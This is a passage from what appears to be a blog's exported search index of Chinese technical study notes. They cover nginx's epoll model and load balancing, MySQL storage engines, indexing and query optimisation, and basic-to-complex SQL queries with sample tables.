中内核则维护一个链表，epoll_wait 直接检查链表是不是空就知道是否有文件描述符准备好了。（epoll 与 select 相比最大的优点是不会随着 sockfd 数目增长而降低效率，使用 select() 时，内核采用轮训的方法来查看是否有fd 准备好，其中的保存 sockfd 的是类似数组的数据结构 fd_set，key 为 fd，value 为 0 或者 1。） 能达到这种效果，是因为在内核实现中 epoll 是根据每个 sockfd 上面的与设备驱动程序建立起来的回调函数实现的。那么，某个 sockfd 上的事件发生时，与它对应的回调函数就会被调用，来把这个 sockfd 加入链表，其他处于“空闲的”状态的则不会。在这点上，epoll 实现了一个”伪”AIO。但是如果绝大部分的 I/O 都是“活跃的”，每个 socket 使用率很高的话，epoll效率不一定比 select 高（可能是要维护队列复杂）。 可以看出，因为一个进程里只有一个线程，所以一个进程同时只能做一件事，但是可以通过不断地切换来“同时”处理多个请求。 例子：Nginx 会注册一个事件：“如果来自一个新客户端的连接请求到来了，再通知我”，此后只有连接请求到来，服务器才会执行 accept() 来接收请求。又比如向上游服务器（比如 PHP-FPM）转发请求，并等待请求返回时，这个处理的 worker 不会在这阻塞，它会在发送完请求后，注册一个事件：“如果缓冲区接收到数据了，告诉我一声，我再将它读进来”，于是进程就空闲下来等待事件发生。 这样，基于 多进程+epoll， Nginx 便能实现高并发。 10.几种负载均衡的算法介绍 轮询（默认） 每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。 weight 指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。 ip_hash 每个请求按访问ip的hash结果分配，这样每个访客固定访问同一个后端服务器，可以解决session的问题。但是不能解决宕机问题。前三种是nginx自带的，直接在配置文件中配置即可使用。 fair（第三方） 按后端服务器的相应时间来分配请求，相应时间短的优先分配。 url_hash（第三方） 按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。 11.基于不同层次的负载均衡 七层就是基于URL等应用层信息的负载均衡；同理，还有基于MAC地址的二层负载均衡和基于IP地址的三层负载均衡。 换句话说: 二层负载均衡会通过一个虚拟MAC地址接受请求，然后再分配到真是的MAC地址； 三层负载均衡会通过一个虚拟IP地址接收请求，然后再分配到真实的IP地址； 四层通过虚拟的URL或主机名接收请求，然后再分配到真是的服务器。 所谓的四到七层负载均衡，就是在对后台的服务器进行负载均衡时，依据四层的信息或七层的信息来决定怎么样转发流量。 比如四层的负载均衡，就是通过发布三层的IP地址（VIP），然后加四层的端口号，来决定哪些流量需要做负载均衡，对需要处理的流量进行NAT处理，转发至后台服务器，并记录下这个TCP或者UDP的流量是由哪台服务器处理的，后续这个连接的所有流量都同样转发到同一台服务器处理。 七层的负载均衡，就是在四层的基础上（没有四层是绝对不可能有七层的），再考虑应用层的特征，比如同一个Web服务器的负载均衡，除了根据VIP加80端口辨别是否需要处理的流量，还可根据七层的URL、浏览器类别、语言来决定是否要进行负载均衡。举个例子，如果你的Web服务器分成两组，一组是中文语言的，一组是英文语言的，那么七层负载均衡就可以当用户来访问你的域名时，自动辨别用户语言，然后选择对应的语言服务器组进行负载均衡处理。 负载均衡器通常称为四层交换机或七层交换机。四层交换机主要分析IP层及TCP/UDP层，实现四层流量负载均衡。七层交换机除了支持四层负载均衡以外，还有分析应用层的信息，如HTTP协议URI或Cookie信息。 负载均衡设备也常被称为”四到七层交换机”，那么四层和七层两者到底区别在哪里？ 第一，技术原理上的区别。 所谓四层负载均衡，也就是主要通过报文中的目标地址和端口，再加上负载均衡设备设置的服务器选择方式，决定最终选择的内部服务器。 所谓七层负载均衡，也称为“内容交换”，也就是主要通过报文中的真正有意义的应用层内容，再加上负载均衡设备设置的服务器选择方式，决定最终选择的内部服务器。 第二，应用场景的需求。 七层应用负载的好处，是使得整个网络更”智能化”。例如访问一个网站的用户流量，可以通过七层的方式，将对图片类的请求转发到特定的图片服务器并可以使用缓存技术；将对文字类的请求可以转发到特定的文字服务器并可以使用压缩技术。 另外一个常常被提到功能就是安全性。 12.总结 理解正向代理和反向代理的概念 nginx的优点和使用场景 master和work两种进程的作用 如何热部署 Nginx单点故障的预防 映射静态文件、反向代理跳转到后端服务器处理的写法 惊群现象 Nginx 采用的是多进程（单线程） &amp; 多路IO复用模型(底层依靠epoll实现) 几种负载均衡的算法 四层的负载均衡和七层的负载均衡]]></content>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL重要知识点]]></title>
    <url>%2F2018%2F07%2F21%2FMySQL%E9%87%8D%E8%A6%81%E7%9F%A5%E8%AF%86%E7%82%B9%2F</url>
    <content type="text"><![CDATA[掌握mysql基础的语法是第一步，了解mysql的存储引擎、索引更是面试重点。 一、存储引擎InnoDBInnoDB 是 MySQL 默认的事务型存储引擎，只有在需要 InnoDB 不支持的特性时，才考虑使用其它存储引擎。 采用 MVCC 来支持高并发，并且实现了四个标准的隔离级别，默认级别是可重复读（REPEATABLE READ），并且通过间隙锁（next-key locking）策略防止幻读的出现。间隙锁使得 InnoDB 不仅仅锁定查询涉及的行，还会对索引中的间隙进行锁定，以防止幻影行的插入。 表是基于聚簇索引建立的，它对主键的查询性能有很大的提升。 内部做了很多优化，包括从磁盘读取数据时采用的可预测性读、能够自动在内存中创建哈希索引以加速读操作的自适应哈希索引、能够加速插入操作的插入缓冲区等。 通过一些机制和工具支持真正的热备份。其它存储引擎不支持热备份，要获取一致性视图需要停止对所有表的写入，而在读写混合场景中，停止写入可能也意味着停止读取。 MyISAMMyISAM 提供了大量的特性，包括压缩表、空间数据索引等。 不支持事务。 不支持行级锁，只能对整张表加锁，读取时会对需要读到的所有表加共享锁，写入时则对表加排它锁。但在表有读取查询的同时，也可以往表中插入新的记录，这被称为并发插入（CONCURRENT INSERT）。 可以手工或者自动执行检查和修复操作，但是和事务恢复以及崩溃恢复不同，可能导致一些数据丢失，而且修复操作是非常慢的。 如果指定了 DELAY_KEY_WRITE 选项，在每次修改执行完成时，不会立即将修改的索引数据写入磁盘，而是会写到内存中的键缓冲区，只有在清理键缓冲区或者关闭表的时候才会将对应的索引块写入磁盘。这种方式可以极大的提升写入性能，但是在数据库或者主机崩溃时会造成索引损坏，需要执行修复操作。 MyISAM 设计简单，数据以紧密格式存储。对于只读数据，或者表比较小、可以容忍修复操作，则依然可以继续使用 MyISAM。 比较 事务：InnoDB 是事务型的。 备份：InnoDB 支持在线热备份。 崩溃恢复：MyISAM 崩溃后发生损坏的概率比 InnoDB 高很多，而且恢复的速度也更慢。 并发：MyISAM 只支持表级锁，而 InnoDB 还支持行级锁。 其它特性：MyISAM 支持压缩表和空间数据索引。 二、数据类型整型TINYINT, SMALLINT, MEDIUMINT, INT, BIGINT 分别使用 8, 16, 24, 32, 64 位存储空间，一般情况下越小的列越好。 INT(11) 中的数字只是规定了交互工具显示字符的个数，对于存储和计算来说是没有意义的。 浮点数FLOAT 和 DOUBLE 为浮点类型，DECIMAL 为高精度小数类型。CPU 原生支持浮点运算，但是不支持 DECIMAl 类型的计算，因此 DECIMAL 的计算比浮点类型需要更高的代价。 FLOAT、DOUBLE 和 DECIMAL 都可以指定列宽，例如 DECIMAL(18, 9) 表示总共 18 位，取 9 位存储小数部分，剩下 9 位存储整数部分。 字符串主要有 CHAR 和 VARCHAR 两种类型，一种是定长的，一种是变长的。 VARCHAR 这种变长类型能够节省空间，因为只需要存储必要的内容。但是在执行 UPDATE 时可能会使行变得比原来长，当超出一个页所能容纳的大小时，就要执行额外的操作。MyISAM 会将行拆成不同的片段存储，而 InnoDB 则需要分裂页来使行放进页内。 VARCHAR 会保留字符串末尾的空格，而 CHAR 会删除。 时间和日期MySQL 提供了两种相似的日期时间类型：DATATIME 和 TIMESTAMP。 1. DATATIME能够保存从 1001 年到 9999 年的日期和时间，精度为秒，使用 8 字节的存储空间。 它与时区无关。 默认情况下，MySQL 以一种可排序的、无歧义的格式显示 DATATIME 值，例如2008-01-16 22:37:08，这是 ANSI 标准定义的日期和时间表示方法。 2. TIMESTAMP和 UNIX 时间戳相同，保存从 1970 年 1 月 1 日午夜（格林威治时间）以来的秒数，使用 4 个字节，只能表示从 1970 年 到 2038 年。 它和时区有关，也就是说一个时间戳在不同的时区所代表的具体时间是不同的。 MySQL 提供了 FROM_UNIXTIME() 函数把 UNIX 时间戳转换为日期，并提供了 UNIX_TIMESTAMP() 函数把日期转换为 UNIX 时间戳。 默认情况下，如果插入时没有指定 TIMESTAMP 列的值，会将这个值设置为当前时间。 应该尽量使用 TIMESTAMP，因为它比 DATETIME 空间效率更高。 三、索引索引是在存储引擎层实现的，而不是在服务器层实现的，所以不同存储引擎具有不同的索引类型和实现。 索引能够轻易将查询性能提升几个数量级。 对于非常小的表、大部分情况下简单的全表扫描比建立索引更高效。对于中到大型的表，索引就非常有效。但是对于特大型的表，建立和使用索引的代价将会随之增长。这种情况下，需要用到一种技术可以直接区分出需要查询的一组数据，而不是一条记录一条记录地匹配，例如可以使用分区技术。 B-Tree 和 B+Tree 原理1. B-Tree 定义一条数据记录为一个二元组 [key, data]，B-Tree 是满足下列条件的数据结构： 所有叶节点具有相同的深度，也就是说 B-Tree 是平衡的； 一个节点中的 key 从左到右非递减排列； 如果某个指针的左右相邻 key 分别是 keyi 和 keyi+1，且不为 null，则该指针指向节点的所有 key 大于等于 keyi 且小于等于 keyi+1。 查找算法：首先在根节点进行二分查找，如果找到则返回对应节点的 data，否则在相应区间的指针指向的节点递归进行查找。 由于插入删除新的数据记录会破坏 B-Tree 的性质，因此在插入删除时，需要对树进行一个分裂、合并、转移等操作以保持 B-Tree 性质。 2. B+Tree 与 B-Tree 相比，B+Tree 有以下不同点： 每个节点的指针上限为 2d 而不是 2d+1（d 为节点的出度）； 内节点不存储 data，只存储 key； 叶子节点不存储指针。 3. 顺序访问指针 一般在数据库系统或文件系统中使用的 B+Tree 结构都在经典 B+Tree 基础上进行了优化，在叶子节点增加了顺序访问指针，做这个优化的目的是为了提高区间访问的性能。 4. B+Tree 和 B-Tree 优势红黑树等平衡树也可以用来实现索引，但是文件系统及数据库系统普遍采用 B+Tree 和 B-Tree 作为索引结构，主要有以下两个原因： （一）更少的检索次数 平衡树检索数据的时间复杂度等于树高 h，而树高大致为 O(h)=O(logdN)，其中 d 为每个节点的出度。 红黑树的出度为 2，而 B+Tree 与 B-Tree 的出度一般都非常大。红黑树的树高 h 很明显比 B+Tree 和 B-Tree 大非常多，因此检索的次数也就更多。 B+Tree 相比于 B-Tree 更适合外存索引，因为 B+Tree 内节点去掉了 data 域，因此可以拥有更大的出度，检索效率会更高。 （二）利用计算机预读特性 为了减少磁盘 I/O，磁盘往往不是严格按需读取，而是每次都会预读。这样做的理论依据是计算机科学中著名的局部性原理：当一个数据被用到时，其附近的数据也通常会马上被使用。预读过程中，磁盘进行顺序读取，顺序读取不需要进行磁盘寻道，并且只需要很短的旋转时间，因此速度会非常快。 操作系统一般将内存和磁盘分割成固态大小的块，每一块称为一页，内存与磁盘以页为单位交换数据。数据库系统将索引的一个节点的大小设置为页的大小，使得一次 I/O 就能完全载入一个节点，并且可以利用预读特性，临近的节点也能够被预先载入。 索引分类1. B+Tree 索引 《高性能 MySQL》一书使用 B-Tree 进行描述，其实从技术上来说这种索引是 B+Tree，因为只有叶子节点存储数据值。 B+Tree 索引是大多数 MySQL 存储引擎的默认索引类型。 因为不再需要进行全表扫描，只需要对树进行搜索即可，因此查找速度快很多。除了用于查找，还可以用于排序和分组。 可以指定多个列作为索引列，多个索引列共同组成键。B+Tree 索引适用于全键值、键值范围和键前缀查找，其中键前缀查找只适用于最左前缀查找。如果不是按照索引列的顺序进行查找，则无法使用索引。 2. 哈希索引基于哈希表实现，优点是查找非常快。 在 MySQL 中只有 Memory 引擎显式支持哈希索引。 InnoDB 引擎有一个特殊的功能叫“自适应哈希索引”，当某个索引值被使用的非常频繁时，会在 B+Tree 索引之上再创建一个哈希索引，这样就让 B+Tree 索引具有哈希索引的一些优点，比如快速的哈希查找。 限制： 哈希索引只包含哈希值和行指针，而不存储字段值，所以不能使用索引中的值来避免读取行。不过，访问内存中的行的速度很快，所以大部分情况下这一点对性能影响并不明显； 无法用于排序与分组； 只支持精确查找，无法用于部分查找和范围查找； 如果哈希冲突很多，查找速度会变得很慢。 3. 空间数据索引（R-Tree）MyISAM 存储引擎支持空间数据索引，可以用于地理数据存储。 空间数据索引会从所有维度来索引数据，可以有效地使用任意维度来进行组合查询。 必须使用 GIS 相关的函数来维护数据。 4. 全文索引MyISAM 存储引擎支持全文索引，用于查找文本中的关键词，而不是直接比值是否相等。查找条件使用 MATCH AGAINST，而不是普通的 WHERE。 InnoDB 存储引擎在 MySQL 5.6.4 版本中也开始支持全文索引。 索引的优点 大大减少了服务器需要扫描的数据量； 帮助服务器避免进行排序和创建临时表（B+Tree 索引是有序的，可以用来做 ORDER BY 和 GROUP BY 操作）； 将随机 I/O 变为顺序 I/O（B+Tree 索引是有序的，也就将相邻的数据都存储在一起）。 索引优化1. 独立的列在进行查询时，索引列不能是表达式的一部分，也不能是函数的参数，否则无法使用索引。 例如下面的查询不能使用 actor_id 列的索引： 1SELECT actor_id FROM sakila.actor WHERE actor_id + 1 = 5; 2. 多列索引在需要使用多个列作为条件进行查询时，使用多列索引比使用多个单列索引性能更好。例如下面的语句中，最好把 actor_id 和 film_id 设置为多列索引。 12SELECT film_id, actor_ id FROM sakila.film_actorWhERE actor_id = 1 AND film_id = 1; 3. 索引列的顺序让选择性最强的索引列放在前面，索引的选择性是指：不重复的索引值和记录总数的比值。最大值为 1，此时每个记录都有唯一的索引与其对应。选择性越高，查询效率也越高。 例如下面显示的结果中 customer_id 的选择性比 staff_id 更高，因此最好把 customer_id 列放在多列索引的前面。 1234SELECT COUNT(DISTINCT staff_id)/COUNT(*) AS staff_id_selectivity,COUNT(DISTINCT customer_id)/COUNT(*) AS customer_id_selectivity,COUNT(*)FROM payment; 123 staff_id_selectivity: 0.0001customer_id_selectivity: 0.0373 COUNT(*): 16049 4. 前缀索引对于 BLOB、TEXT 和 VARCHAR 类型的列，必须使用前缀索引，只索引开始的部分字符。 对于前缀长度的选取需要根据索引选择性来确定。 5. 覆盖索引索引包含所有需要查询的字段的值。 优点 因为索引条目通常远小于数据行的大小，所以若只读取索引，能大大减少数据访问量。 一些存储引擎（例如 MyISAM）在内存中只缓存索引，而数据依赖于操作系统来缓存。因此，只访问索引可以不使用系统调用（通常比较费时）。 对于 InnoDB 引擎，若二级索引能够覆盖查询，则无需访问聚簇索引。 6. 聚簇索引 聚簇索引并不是一种索引类型，而是一种数据存储方式。 术语“聚簇”表示数据行和相邻的键值紧密地存储在一起，InnoDB 的聚簇索引在同一个结构中保存了 B+Tree 索引和数据行。 因为无法把数据行存放在两个不同的地方，所以一个表只能有一个聚簇索引。 优点 可以把相关数据保存在一起，减少 I/O 操作。例如电子邮件表可以根据用户 ID 来聚集数据，这样只需要从磁盘读取少数的数据也就能获取某个用户的全部邮件，如果没有使用聚聚簇索引，则每封邮件都可能导致一次磁盘 I/O。 数据访问更快。 缺点 聚簇索引最大限度提高了 I/O 密集型应用的性能，但是如果数据全部放在内存，就没必要用聚簇索引。 插入速度严重依赖于插入顺序，按主键的顺序插入是最快的。 更新操作代价很高，因为每个被更新的行都会移动到新的位置。 当插入到某个已满的页中，存储引擎会将该页分裂成两个页面来容纳该行，页分裂会导致表占用更多的磁盘空间。 如果行比较稀疏，或者由于页分裂导致数据存储不连续时，聚簇索引可能导致全表扫描速度变慢。 四、查询性能优化使用 Explain 进行分析Explain 用来分析 SELECT 查询语句，开发人员可以通过分析结果来优化查询语句。 比较重要的字段有： select_type : 查询类型，有简单查询、联合查询、子查询等 key : 使用的索引 rows : 扫描的行数 优化数据访问1. 减少请求的数据量（一）只返回必要的列 最好不要使用 SELECT * 语句。 （二）只返回必要的行 使用 WHERE 语句进行查询过滤，有时候也需要使用 LIMIT 语句来限制返回的数据。 （三）缓存重复查询的数据 使用缓存可以避免在数据库中进行查询，特别要查询的数据经常被重复查询，缓存可以带来的查询性能提升将会是非常明显的。 2. 减少服务器端扫描的行数最有效的方式是使用索引来覆盖查询。 重构查询方式1. 切分大查询一个大查询如果一次性执行的话，可能一次锁住很多数据、占满整个事务日志、耗尽系统资源、阻塞很多小的但重要的查询。 1DELEFT FROM messages WHERE create &lt; DATE_SUB(NOW(), INTERVAL 3 MONTH); 12345rows_affected = 0do &#123; rows_affected = do_query( "DELETE FROM messages WHERE create &lt; DATE_SUB(NOW(), INTERVAL 3 MONTH) LIMIT 10000")&#125; while rows_affected &gt; 0 2. 分解大连接查询将一个大连接查询（JOIN）分解成对每一个表进行一次单表查询，然后将结果在应用程序中进行关联，这样做的好处有： 让缓存更高效。对于连接查询，如果其中一个表发生变化，那么整个查询缓存就无法使用。而分解后的多个查询，即使其中一个表发生变化，对其它表的查询缓存依然可以使用。 减少锁竞争； 在应用层进行连接，可以更容易对数据库进行拆分，从而更容易做到高性能和可扩展。 查询本身效率也可能会有所提升。例如下面的例子中，使用 IN() 代替连接查询，可以让 MySQL 按照 ID 顺序进行查询，这可能比随机的连接要更高效。 分解成多个单表查询，这些单表查询的缓存结果更可能被其它查询使用到，从而减少冗余记录的查询。 1234SELECT * FROM tabJOIN tag_post ON tag_post.tag_id=tag.idJOIN post ON tag_post.post_id=post.idWHERE tag.tag='mysql'; 123SELECT * FROM tag WHERE tag='mysql';SELECT * FROM tag_post WHERE tag_id=1234;SELECT * FROM post WHERE post.id IN (123,456,567,9098,8904); 五、切分水平切分 水平切分就是就是常见的 Sharding，它是将同一个表中的记录拆分到多个结构相同的表中。 当一个表的数据不断增多时，Sharding 是必然的选择，它可以将数据分布到集群的不同节点上，从而缓存单个数据库的压力。 垂直切分 垂直切分是将一张表按列切分成多个表，通常是按照列的关系密集程度进行切分。也可以利用垂直切分将经常被使用的列和不经常被使用的列切分到不同的表中。 也可以在数据库的层面使用垂直切分，它按数据库中表的密集程度部署到不同的库中，例如将原来的电商数据库垂直切分成商品数据库 payDB、用户数据库 userBD 等。 Sharding 策略 哈希取模：hash(key) % NUM_DB 范围：可以是 ID 范围也可以是时间范围 映射表：使用单独的一个数据库来存储映射关系 Sharding 存在的问题1. 事务问题使用分布式事务。 2. JOIN将原来的 JOIN 查询分解成多个单表查询，然后在用户程序中进行 JOIN。 3. ID 唯一性 使用全局唯一 ID：GUID。 为每个分片指定一个 ID 范围。 分布式 ID 生成器 (如 Twitter 的 Snowflake 算法)。 转自： MySQL]]></content>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql最基础知识小结]]></title>
    <url>%2F2018%2F07%2F21%2Fmysql%E6%9C%80%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[进行一个简单的小结。 一、DDL语句 1、创建数据库：create database dbname; 2、删除数据库：drop database dbname; 3、创建表：create table tname; 4、删除表：drop table tname; 5、修改表：略，懒得看 二、DML语句 插入： 1insert into table(字段1，字段2，...) values (value1,value2,...) , (value3,value4,..) 更新： 1update table set 字段=value where ... 删除： 1delete from table where ... 单表查询： 1select 字段 from table 连表查询方式1： 1select 别名1.字段,别名2.字段 from table1 别名1,table2 别名2 where ... 连表查询方式2： 1select 别名1.字段,别名2.字段 from table1 别名1 join table2 别名2 on ... 查询不重复的记录： 1select distinct 字段 from table ... 排序：默认是升序 1select 字段 from table where ... order by ... asc/desc limit：主要用于分页 1select * from table where ... order by ... asc/desc limit 起始偏移位置，显示条数 聚合： 1select count(*)/avg(..)/sum(...)/max(...)/min(...) from table group by ... having .... 注意这里的having和where的区别：where是对表结果进行筛选，having 是对查询结果进行筛选，与group by` 合用 左连接和右连接左连接意思就是左表中的记录都在，右表没有匹配项就以null显示。记录数等于左表的行数。右连接与之同理，尽量转为左连接做。 子查询： 1select * from table where ... in (select ....) 所谓子查询就是根据另一个select的结果再进行筛选，常用的是in,not in,=,!=,exits,not exits union 主要用于两张表中的数据的合并：1select 字段 from table1 union all select 字段 from table2 要想不重复用union]]></content>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql复杂查询基础]]></title>
    <url>%2F2018%2F07%2F21%2Fmysql%E5%A4%8D%E6%9D%82%E6%9F%A5%E8%AF%A2%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[这是我自己的关于mysql基础的学习笔记，想想还是贴在这里了，主要还是看之前的《sql必知必会》。 1、新建student,teacher,course,score四张表,建表以及准备基本数据： student: 12345678910111213141516CREATE TABLE `student`(`Sid` bigint(11) NOT NULL AUTO_INCREMENT COMMENT '学生id',`Sname` varchar(8) NOT NULL COMMENT '学生姓名',`Ssex` varchar(2) NOT NULL COMMENT '学生性别',`Sbirthday` datetime NULL ON UPDATE CURRENT_TIMESTAMP COMMENT '学生出生日期',PRIMARY KEY (`S_id`));INSERT INTO student(Sname,Ssex,Sbirthday) VALUES("赵蕾","男","1990-01-01 00:00:00");INSERT INTO student(Sname,Ssex,Sbirthday) VALUES("毕竟","男","1990-11-01 00:00:00");INSERT INTO student(Sname,Ssex,Sbirthday) VALUES("卖你","男","1990-05-01 00:00:00");INSERT INTO student(Sname,Ssex,Sbirthday) VALUES("机器","男","1990-08-01 00:00:00");INSERT INTO student(Sname,Ssex,Sbirthday) VALUES("电话","女","1991-01-01 00:00:00");INSERT INTO student(Sname,Ssex,Sbirthday) VALUES("没事","女","1992-01-01 00:00:00");INSERT INTO student(Sname,Ssex,Sbirthday) VALUES("请问","女","1989-01-01 00:00:00");INSERT INTO student(Sname,Ssex,Sbirthday) VALUES("阿三","女","1990-01-01 00:00:00"); teacher: 123456789CREATE TABLE `teacher` (`Tid` bigint(10) NOT NULL AUTO_INCREMENT COMMENT '老师id',`Tname` varchar(10) NOT NULL COMMENT '老师姓名',PRIMARY KEY (`Tid`));INSERT INTO teacher(Tname) VALUES("张三");INSERT INTO teacher(Tname) VALUES("李四");INSERT INTO teacher(Tname) VALUES("王五"); course: 12345678910CREATE TABLE `course` (`Cid` bigint(10) NOT NULL AUTO_INCREMENT COMMENT '课程id',`Cname` varchar(10) NOT NULL COMMENT '课程名称',`Tid` int(10) NOT NULL COMMENT '老师id',PRIMARY KEY (`Cid`));INSERT INTO course(Cname,Tid) VALUES("语文",1);INSERT INTO course(Cname,Tid) VALUES("数学",2);INSERT INTO course(Cname,Tid) VALUES("英语",3); score: 1234567891011121314151617181920212223242526注意这里的Sid和Cid是联合主键，分别代表学生id和课程idCREATE TABLE `score` (`Sid` bigint(11) NOT NULL COMMENT '学生id',`Cid` bigint(11) NOT NULL COMMENT '课程id',`score` varchar(255) NOT NULL COMMENT '分数',PRIMARY KEY (`Sid`, `Cid`));INSERT INTO score(Sid,Cid,score) VALUES(1,1,80.0);INSERT INTO score(Sid,Cid,score) VALUES(1,2,90.0);INSERT INTO score(Sid,Cid,score) VALUES(1,3,99.0);INSERT INTO score(Sid,Cid,score) VALUES(2,1,70.0);INSERT INTO score(Sid,Cid,score) VALUES(2,2,60.0);INSERT INTO score(Sid,Cid,score) VALUES(2,3,80.0);INSERT INTO score(Sid,Cid,score) VALUES(3,1,80.0);INSERT INTO score(Sid,Cid,score) VALUES(3,2,80.0);INSERT INTO score(Sid,Cid,score) VALUES(3,3,80.0);INSERT INTO score(Sid,Cid,score) VALUES(4,1,50.0);INSERT INTO score(Sid,Cid,score) VALUES(4,2,30.0);INSERT INTO score(Sid,Cid,score) VALUES(4,3,20.0);INSERT INTO score(Sid,Cid,score) VALUES(5,1,76.0);INSERT INTO score(Sid,Cid,score) VALUES(5,2,87.0);INSERT INTO score(Sid,Cid,score) VALUES(6,1,31.0);INSERT INTO score(Sid,Cid,score) VALUES(6,3,37.0);INSERT INTO score(Sid,Cid,score) VALUES(7,2,89.0);INSERT INTO score(Sid,Cid,score) VALUES(7,3,98.0); 2、简单的查询 where … and … 12#名字是赵蕾并且性别是男的数据select * from student s where s.Sname="赵蕾" AND s.Ssex="男"; where … or … 12#名字是赵蕾或者性别是男的数据select * from student s where s.Sname="赵蕾" OR s.Ssex="男"; distinct 不重复的数据 1SELECT DISTINCT s.Ssex FROM student s order by 排序 12345678#升序SELECT * from student s ORDER BY s.Sbirthday ASC#降序SELECT * from student s ORDER BY s.Sbirthday DESC#多个条件，顺序匹配SELECT * from student s ORDER BY s.Sbirthday DESC,s.Sid DESC 模糊查询 1SELECT * from student s WHERE s.Sname LIKE '赵%' limit (偏移位置，查询数量) 1SELECT * from student s ORDER BY s.Sbirthday DESC LIMIT 0,3 max min sum avg count等函数 1234567SELECT MAX(s.score) from score s SELECT MIN(s.score) from score s SELECT SUM(s.score) from score s SELECT AVG(s.score) from score s in,not in 123SELECT * from score s WHERE s.score IN (80,90,99)SELECT * from score s WHERE s.score NOT IN (80,90,99) between 1SELECT * from score s WHERE s.score BETWEEN 90 AND 100 联合查询 查询学生分别考多少分1SELECT s.Sname,sc.score from student s,score sc WHERE s.Sid = sc.Sid 查询单科最高分数的那个学生12SELECT s.Sname,sc.score from student s,score sc WHERE s.Sid = sc.SidAND sc.score = (SELECT MAX(score.score) FROM score) 再把对应的老师也调出来,老的方式进行表的连接,用了子查询，查出最高分的那个人12345678910111213141516171819SELECT s.Sname, sc.score, t.TnameFROM student s, score sc, teacher t, course cWHERE s.Sid = sc.SidAND sc.Cid = c.CidAND c.Tid = t.TidAND sc.score = ( SELECT MAX(score.score) FROM score) group by 12345678910#查询每门学科的平均分SELECT AVG(sc.score),c.Cname FROM score sc,course c WHERE sc.Cid=c.Cid GROUP BY sc.Cid#分组之后的筛选，用having把平均分大于70的一条显示出来SELECT AVG(sc.score),c.Cname FROM score sc,course c WHERE sc.Cid=c.Cid GROUP BY sc.Cid HAVING AVG(sc.score)&gt;70#having和where区别#having与where类似，可以筛选数据，where后的表达式怎么写，having后就怎么写#where针对表中的列发挥作用，查询数据#having对查询结果中的列发挥作用，筛选数据 join 12345678910111213#用join代替上面的老语法SELECT s.Sname,sc.score,t.Tname from student s JOIN teacher t JOIN score sc JOIN course cWHERE sc.Sid=s.Sid AND sc.Cid=c.Cid AND c.Tid=t.Tid AND sc.score = ( SELECT MAX(score.score) FROM score)#两种外连接：左连接和右连接，左连接就是左边表全出来，右边不符合的就以空显示出来；#右连接也是如此。SELECT s.Sname,sc.score from student s LEFT JOIN score sc on s.Sid = sc.Sid此时发现8号阿三这位姑娘显示出来了，但是分数为null。 case when:类似于swith..case.. 先查出每个学生每门成绩是多少： 12345678SELECT s.Sname, c.Cname, sc.scoreFROM student sJOIN score sc ON s.Sid = sc.SidJOIN course c ON c.Cid = sc.Cid 将90以上置为优秀，80-90分之间为良好，80以下为勉强12345678910SELECT s.Sname, c.Cname,CASE WHEN sc.score&gt;90 THEN '优秀' WHEN sc.score BETWEEN 80 AND 90 THEN '良好'ELSE '勉强' ENDFROM student sJOIN score sc ON s.Sid = sc.SidJOIN course c ON c.Cid = sc.Cid 行转列 123456789SELECT s.Sname,CASE sc.Cid WHEN 1 THEN sc.score end AS '语文',CASE sc.Cid WHEN 2 THEN sc.score end AS '数学',CASE sc.Cid WHEN 3 THEN sc.score end AS '英语'FROM student sJOIN score sc ON s.Sid = sc.SidJOIN course c ON c.Cid = sc.Cid 子查询 1#分为三种：where型子查询、from型子查询、exists型子查询 union 12#用于合并两个或多个 SELECT 语句的结果集，并消去表中任何重复行。如果允许重复的值，请使用 UNION ALL。#UNION 内部的 SELECT 语句必须拥有相同数量的列，列也必须拥有相似的数据类型。 3、mysql中四种隔离机制 未提交读(Read Uncommitted)：允许脏读，也就是可能读取到其他会话中未提交事务修改的数据 提交读(Read Committed)：只能读取到已经提交的数据。Oracle等多数数据库默认都是该级别 (不重复读) 可重复读(Repeated Read)：可重复读。在同一个事务内的查询都是事务开始时刻一致的，InnoDB默认级别。在SQL标准中，该隔离级别消除了不可重复读，但是还存在幻象读。在mysql中，是默认的隔离机制，并且解决了在插入数据时产生的幻影读的问题。 串行读(Serializable)：完全串行化的读，每次读都需要获得表级共享锁，读写相互都会阻塞。效率比较低。 mysql中，默认的引擎是InnoDB默认是可重复读的（REPEATABLE READ），支持事务。 还有一种是MyISAM引擎，不支持事务，对于不修改的数据效率查询比较高。 名词解释： 脏读: 脏读就是指当一个事务正在访问数据，并且对数据进行了修改，而这种修改还没有提交到数据库中，这时，另外一个事务也访问这个数据，然后使用了这个数据。 不可重复读:是指在一个事务内，多次读同一数据。在这个事务还没有结束时，另外一个事务也访问该同一数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改，那么第一个事务两次读到的的数据可能是不一样的。这样就发生了在一个事务内两次读到的数据是不一样的，因此称为是不可重复读。 可重复读:两个事务，一个事务中修改提交了，另一个事务整个过程不受其影响。 幻读:第一个事务对一个表中的数据进行了修改，这种修改涉及到表中的全部数据行。同时，第二个事务也修改这个表中的数据，这种修改是向表中插入一行新数据。那么，以后就会发生操作第一个事务的用户发现表中还有没有修改的数据行，就好象发生了幻觉一样。简而言之就是一个事务中增加了一条记录，另一个事务中一开始没读到，然后想插入同样的记录的时候报错了，因为重复了。]]></content>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[maven]]></title>
    <url>%2F2018%2F07%2F21%2Fmaven%2F</url>
